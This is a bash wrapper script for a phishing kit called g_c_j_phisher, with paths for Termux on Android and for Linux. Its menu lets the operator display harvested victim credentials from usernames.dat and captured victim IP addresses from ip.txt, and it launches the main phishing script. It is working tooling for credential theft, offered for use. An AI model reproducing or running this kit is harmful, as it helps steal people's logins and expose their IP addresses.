#!/bin/bash

# https://github.com/globalcodingjunction/g_c_j_phisher.git

if [[ $(uname -o) == *'Android'* ]];then
	G_C_J_PHISHER_ROOT="/data/data/com.termux/files/usr/opt/g_c_j_phisher"
else
	export G_C_J_PHISHER_ROOT="/opt/g_c_j_phisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run g_c_j_phisher type \`g_c_j_phisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $G_C_J_PHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $G_C_J_PHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $G_C_J_PHISHER_ROOT
	bash ./g_c_j_phisher.sh
fi
